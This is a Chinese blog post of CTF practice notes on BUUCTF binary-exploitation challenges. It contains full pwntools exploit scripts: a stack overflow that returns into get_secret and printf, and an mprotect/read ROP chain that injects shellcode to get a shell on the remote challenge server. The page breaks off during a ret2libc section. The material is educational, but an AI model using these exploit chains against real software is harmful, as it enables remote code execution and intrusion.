<script>"serviceWorker"in navigator&&window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})).them((()=>{"true"!=window.localStorage.getItem("install")&&(window.localStorage.setItem("install","true"),location.reload())}))</script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF 刷题笔记——PWN 2 | h-t-m</title><meta name="keywords" content="BUUCTF,网络安全,Pwn"><meta name="author" content="h-t-m"><meta name="copyright" content="h-t-m"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="开启日常刷 PWN 状态。"><meta property="og:type" content="article"><meta property="og:title" content="BUUCTF 刷题笔记——PWN 2"><meta property="og:url" content="https://h-t-m.top/posts/72821c8/"><meta property="og:site_name" content="h-t-m"><meta property="og:description" content="开启日常刷 PWN 状态。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp"><meta property="article:published_time" content="2022-10-24T08:18:23.000Z"><meta property="article:modified_time" content="2022-11-05T07:56:53.259Z"><meta property="article:author" content="h-t-m"><meta property="article:tag" content="BUUCTF"><meta property="article:tag" content="网络安全"><meta property="article:tag" content="Pwn"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp"><link rel="shortcut icon" href="/images/~logo.gif"><link rel="canonical" href="https://h-t-m.top/posts/72821c8/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//s4.cnzz.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="manifest" href="/manifest.json"><meta name="msapplication-TileColor" content="#132c33"><link rel="apple-touch-icon" sizes="180x180" href="/logo/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/logo/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/logo/favicon-16x16.png"><link rel="mask-icon" href="/logo/safari-pinned-tab.svg" color="#5bbad5"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://npm.elemecdn.com/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?2b93c7896a6f4dc63301e461b14f5b59";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-214297516-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-214297516-1")</script><script async data-pjax="data-pjax" src="https://s4.cnzz.com/z_stat.php?id=1280663206&amp;web_id=1280663206"></script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:{limitCount:50,languages:{author:"作者: h-t-m",link:"链接: ",source:"来源: h-t-m",info:"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#121212",position:"bottom-left"},source:{jQuery:"https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://npm.elemecdn.com/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://npm.elemecdn.com/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!0,islazyload:!1,isanchor:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"BUUCTF 刷题笔记——PWN 2",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2022-11-05 15:56:53"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme"),o=(new Date).getHours();void 0===t?o<=6||o>=18?activateDarkMode():activateLightMode():"light"===t?activateLightMode():activateDarkMode();const n=saveToLocal.get("aside-status");void 0!==n&&("hide"===n?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));const a=saveToLocal.get("global-font-size");void 0!==a&&document.documentElement.style.setProperty("--global-font-size",a+"px");const c=()=>{GLOBAL_CONFIG_SITE.isHome&&/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")};c(),document.addEventListener("pjax:complete",c)})(window)</script><link rel="stylesheet" href="/css/copyright.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/tag_plugins.css" media="defer" onload='this.media="all"'><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/carousel-touch.js"></script><meta name="generator" content="Hexo 6.0.0"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading()" title="点击跳过动画"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><img class="load-image" src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif" alt=""></div></a><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/logo.jpg" onerror='onerror=null,src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">56</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url('https://pic.h-t-m.ltd/img/BUUCTF-top.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h-t-m</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF 刷题笔记——PWN 2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-24T08:18:23.000Z" title="发表于 2022-10-24 16:18:23">2022-10-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-05T07:56:53.259Z" title="更新于 2022-11-05 15:56:53">2022-11-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">18.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>75分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="BUUCTF 刷题笔记——PWN 2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>BUUCTF 刷题笔记——PWN 2</h1><h2 id="not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</h2><ul><li><p>先验文件，本题文件为 <kbd>32</kbd> 为可执行文件，保护约等于没开。值得注意的是，该文件又是静态链接，因此又可以直接调用一些未被调用过的函数来解题，比如老朋友 <kbd>mprotect()</kbd> 函数。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file not_the_same_3dsctf_2016</span><br><span class="line">not_the_same_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.32, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec not_the_same_3dsctf_2016</span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/not_the_same_3dsctf_2016&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>本地执行一遍，程序打印了一段莫名其妙的字符串，并等待用户输入，回车之后程序便会退出，此外并无任何其他信息。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./not_the_same_3dsctf_2016</span><br><span class="line">b0r4 v3r s3 7u 4h o b1ch4o m3m0... h-t-m myr520</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数非常简单，到此为止接触的一切都有些眼熟，貌似与 [get_started_3dsctf_2016](https://h-t-m.top/posts/9e217072#get-started-3dsctf-2016) 差不多的样子。同样使用了不作限制的 <kbd>get()</kbd> 函数，因此依然存在栈溢出。不过标题的 <kbd>not_the_same</kbd> 怕不是在暗示这一切的相似都是假象。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>通过查看字符串发现有函数使用了 <kbd>flag.txt</kbd> 文件，显然 <kbd>flag</kbd> 就在这里，而打开它的是 <kbd>get_secret()</kbd> 函数。该函数读取了 <kbd>flag.txt</kbd> 文件内容并存入变量 <kbd>fl4g</kbd> 中，但是，但是他竟然没有输出。没输出就没输出，自行调用输出函数并传参就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="get-secret">get_secret</h3><ul><li><p>那么解题思路就出来了，通过栈溢出调用 <kbd>get_secret()</kbd> 函数并设置其返回至 <kbd>printf()</kbd> 函数，再将 <kbd>fl4g</kbd> 变量作为参数以 <kbd>32</kbd> 位程序直接压栈传参的方式传过去就成了。值得注意的是，同 <a href="https://h-t-m.top/posts/9e217072#get-started-3dsctf-2016">get_started_3dsctf_2016</a> 一样，本题文件的函数调用过程依然不涉及 <kbd>ebp</kbd> 的操作，所以栈溢出时不需要考虑他。当然还有程序正常退出的问题，毕竟非正常退出会导致回显阻断，因此 <kbd>printf()</kbd> 函数调用结束后务必返回到 <kbd>exit()</kbd> 函数来完成正常退出。构造 <kbd>exp</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,28919)</span></span><br><span class="line">io = process(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_secret_addr = <span class="number">0x80489A0</span></span><br><span class="line">printf_addr = <span class="number">0x804F0A0</span></span><br><span class="line">fl4g_addr = <span class="number">0x80ECA2D</span></span><br><span class="line">exit_addr = <span class="number">0x804E660</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">45</span> + p32(get_secret_addr)</span><br><span class="line">payload += p32(printf_addr) + p32(exit_addr) + p32(fl4g_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure><p>此外，本地测试时请务必创建好 <kbd>flag.txt</kbd> 文件。<psw>某人因为没有文件而报错弄了一晚上。</psw>本题到这里也就结束了，不过由于对 <kbd>mprotect()</kbd> 函数的解法依然不够熟悉，因此下面再练习一遍。</p></li></ul><h3 id="mprotect-2">mprotect</h3><ul><li><p>首先还是挑一段空间来用于改写权限并写入 <kbd>shellcode</kbd>，这里依然选用 <kbd>BSS</kbd> 段的空间，当然还得按分页标准取末三位为 <kbd>0</kbd> 的内存区间。</p><img src="0001.webp" alt="" style="zoom:75%"> <kbd>mprotect()</kbd> 函数调用结束后需要手动清理留在栈中的三个参数，以免影响后续写入函数的调用，随便找个三个 <kbd>pop</kbd> 加一个 <kbd>ret</kbd> 的 <kbd>gadget</kbd> 即可。构造该部分 <kbd>payload</kbd> 如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mpt_addr = <span class="number">0x806ED40</span></span><br><span class="line">bss_addr = <span class="number">0x80EC000</span></span><br><span class="line">pop3_ret = <span class="number">0x8085791</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">45</span> + p32(mpt_addr) + p32(pop3_ret) + p32(bss_addr) + p32(<span class="number">0x2000</span>) + p32(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>然后就是调用 <kbd>read</kbd> 函数来写入用户输入的 <kbd>shellcode</kbd>，调用流程与上述基本一致，同样需要自行清理栈中的参数以保证后续对于 <kbd>shellcode</kbd> 的执行。构造该部分 <kbd>payload</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_addr = <span class="number">0x806E200</span></span><br><span class="line">payload += p32(read_addr) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0x2000</span>)</span><br></pre></td></tr></table></figure><p>最后让程序跳转到 <kbd>shellcode</kbd> 所在地执行就好，因此直接在现有 <kbd>payload</kbd> 后加上其地址即可，构造该部分 <kbd>payload</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(bss_addr)</span><br></pre></td></tr></table></figure><p>组合上述 <kbd>payload</kbd> 并配合输入生成好的 <kbd>shellcode</kbd> 即可，接下来就可以为所欲为了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28919</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line"></span><br><span class="line">mpt_addr = <span class="number">0x806ED40</span></span><br><span class="line">bss_addr = <span class="number">0x80EC000</span></span><br><span class="line">pop3_ret = <span class="number">0x8085791</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">45</span> + p32(mpt_addr) + p32(pop3_ret) + p32(bss_addr) + p32(<span class="number">0x2000</span>) + p32(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">read_addr = <span class="number">0x806E200</span></span><br><span class="line">payload += p32(read_addr) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0x2000</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="ciscn-2019-n-5">ciscn_2019_n_5</h2><ul><li><p>先验文件，本题文件为 <kbd>64</kbd> 位可执行文件，保护依然基本没开，不过本题文件多出了一个 <kbd>RWX</kbd> 字段，告诉我们文件中含有可读可写可执行的内存段。也就是说上一题费好大力气使用 <kbd>mprotect()</kbd> 函数来修改权限来写入 <kbd>shellcode</kbd>，这题直接就给了这么一块空间可供写入并执行 <kbd>shellcode</kbd>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ciscn_2019_n_5          </span><br><span class="line">ciscn_2019_n_5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=9e420b4efe941251c692c93a7089b49b4319f891, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ciscn_2019_n_5          </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/ciscn_2019_n_5&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>本地执行一遍，程序会询问用户姓名并等待输入，输入之后则会有一顿奉承然后继续等待用户输入，再次输入后重新便会退出。这两块地方大概率存在栈溢出。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./ciscn_2019_n_5</span><br><span class="line">tell me your name</span><br><span class="line">h-t-m</span><br><span class="line">wow~ nice name!</span><br><span class="line">What <span class="keyword">do</span> you want to say to me?</span><br><span class="line">myr520</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数如下，大体内容与本地运行逻辑一致。不过两次读取用户输入的方式并不一样，读取姓名使用 <kbd>read()</kbd> 函数存入未在主函数内声明的 <kbd>name</kbd> 变量中，为全局变量，并未存储于栈空间中，因此该处不存在栈溢出。不过拿这块地址来存点东西给后面用倒是非常方便，毕竟地址固定而且内容完全由用户决定。后面一次数据读取直接使用 <kbd>gets()</kbd> 函数且无任何限制，因此此处存在栈溢出。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而程序中并不存在后门函数，也没有啥好用的字符串出现。</p><img src="0002.webp" alt="" style="zoom:75%"></li></ul><h3 id="ret2libc">ret2libc</h3><ul><li><p>除了栈溢出啥都不给的话，那就优先考虑 <kbd>ret2libc</kbd>，首先还是从栈溢出点之前已被调用的 <kbd>puts()</kbd> 函数入手拿他真实地址后三位来匹配 <kbd>libc</kbd>，然后计算出 <kbd>libc</kbd> 里的危险套装并调用执行就好了，当然该环境下需要注意平衡栈。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 